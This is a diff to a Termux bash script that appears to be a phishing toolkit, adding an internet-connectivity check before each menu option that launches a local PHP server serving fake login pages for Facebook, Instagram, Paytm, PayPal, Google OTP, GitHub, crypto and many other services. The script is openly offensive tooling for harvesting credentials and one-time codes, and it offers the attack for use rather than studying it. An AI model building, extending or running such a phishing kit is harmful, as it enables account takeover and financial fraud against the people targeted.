@@ -4,7 +4,32 @@ echo ""
 echo ""
 echo -e "\e[32m                ============================================\e[m "
 echo -e "\e[31m                [\e[32m★\e[31m]\e[93m Follow us on youtube:bhaviktutorials\e[31m [\e[32m★\e[31m]\e[m "
-echo -e "\e[32m                ============================================\e[m "
+echo -e "\e[32m                ============================================\e[m " 
+# check the internet connectivity 
+connection() {
+echo
+while :
+do
+if curl -s --head  --request GET www.google.com | grep "200 OK" > /dev/null ; then
+    echo -e "\e[32m-->> Active Internet Connection\e[m"
+    echo 
+    sleep 1
+    echo -e "\e[32m-->> READY TO GO.........\e[m"
+    sleep 2
+    echo
+    break
+else
+    echo -e "\e[31m-->> Inactive Internet Connection\e[m"
+    sleep 1
+    echo
+    echo -e "\e[33m-->> Check your connection and Try Again!!\e[m"
+    sleep 2
+    echo
+    exit
+fi
+done
+}
+
 echo 
 echo 
 echo -e "\e[31m[\e[32m★\e[31m]\e[32m ENABLE YOUR MOBILE DATA & HOTSPOT TO CONTINUE\e[m "
@@ -108,7 +133,8 @@ ash() {
          then
 	                    cd /data/data/com.termux/files/usr/bin/phs
                             cd facebook/
-                            echo ""   
+                            echo 
+			    connection
 			    echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"   
 			    php -S 127.0.0.1:4444 > /dev/null 2>&1 &    
 			    sleep 2  
@@ -134,7 +160,8 @@ ash() {
 	 then
 			   cd /data/data/com.termux/files/usr/bin/phs
                            cd pinterest/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -160,7 +187,8 @@ ash() {
 	 then
 		           cd /data/data/com.termux/files/usr/bin/phs
 			   cd instagram/
-			   echo ""      
+			   echo 
+			   connection
 			   echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m" 
 			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &  
 			   sleep 2
@@ -186,7 +214,8 @@ ash() {
         then
                           cd /data/data/com.termux/files/usr/bin/phs
 			  cd UberEats-Phishing/
-			  echo " "
+			  echo 
+			  connection
 			  echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
 			  php -S 127.0.0.1:4444 > /dev/null 2>&1 & 
 			  sleep 2  
@@ -212,7 +241,8 @@ ash() {
         then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd ola-otpbypass/
-                          echo ""
+                          echo 
+			  connection
                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m" 
 		          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 		          sleep 2   
@@ -238,7 +268,8 @@ ash() {
 	 then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd google-otp/
-                          echo ""
+                          echo 
+			  connection
 		          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"    
 		          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 		          sleep 2
@@ -264,7 +295,7 @@ ash() {
        then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd Paytm-Phishing/
-                          echo ""
+                          echo 
                           echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Paytm Sign In \e[0m" 
 			  echo
                           echo -e "\e[1;31m[\e[0m\e[1;77m 2 \e[0m\e[1;31m]\e[0m\e[1;32m Paytm Sign UP \e[0m"
@@ -273,7 +304,8 @@ ash() {
 		          if [ $option1 = 1 ] || [ $option1 = 01 ]
 			  then
 			        cd paytm/
-                                echo ""
+                                echo 
+				connection
                                 echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                                 php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                                 sleep 2
@@ -296,7 +328,8 @@ ash() {
 	                	else
                 
                                 cd signup/
-                                echo ""
+                                echo 
+				connection
                                 echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                                 php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                                 sleep 2
@@ -324,7 +357,8 @@ ash() {
 
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd Netflix/
-                          echo ""
+                          echo 
+			  connection
                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 2
@@ -350,7 +384,8 @@ ash() {
 	   then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd instafollow/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -376,7 +411,8 @@ ash() {
 	       then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd amazonsign/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -402,7 +438,8 @@ ash() {
 	          then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd whatsapp-phishing/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -428,7 +465,8 @@ ash() {
 	          then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd Linkedin/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -454,7 +492,8 @@ ash() {
 	             then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd Hotstar-otp-bypass/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -480,7 +519,8 @@ ash() {
 	            then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd spotify/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -506,7 +546,8 @@ ash() {
 	            then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd github/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -530,7 +571,8 @@ ash() {
 	        then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd ipfinder/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -556,7 +598,8 @@ ash() {
 	          then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd Zomato-Phishing/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -582,7 +625,8 @@ ash() {
 	           then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd phonepay/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -608,7 +652,8 @@ ash() {
 	            then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd paypal/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -634,7 +679,8 @@ ash() {
 	            then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd telegram/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -660,7 +706,8 @@ ash() {
 	            then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd twitter/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -686,7 +733,8 @@ ash() {
 	            then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd flipcart/
-                          echo ""
+                          echo 
+			  connection
                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 2
@@ -712,7 +760,8 @@ ash() {
 	          then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd wordpress/
-                          echo ""
+                          echo 
+			  connection
                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 2
@@ -738,7 +787,8 @@ ash() {
 	           then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd snapchat/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -764,7 +814,8 @@ ash() {
 	            then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd protonmail/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -790,7 +841,8 @@ ash() {
 	          then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd stackoverflow/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -816,7 +868,8 @@ ash() {
 	          then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd ebay/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -842,7 +895,8 @@ ash() {
 	          then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd twitch/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -868,7 +922,8 @@ ash() {
 	            then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd ajio/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -894,7 +949,8 @@ ash() {
 	           then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd cryptocurrency/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
@@ -920,7 +976,8 @@ ash() {
 	          then               
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd mobikwik/
-                           echo ""
+                           echo 
+			   connection
                            echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
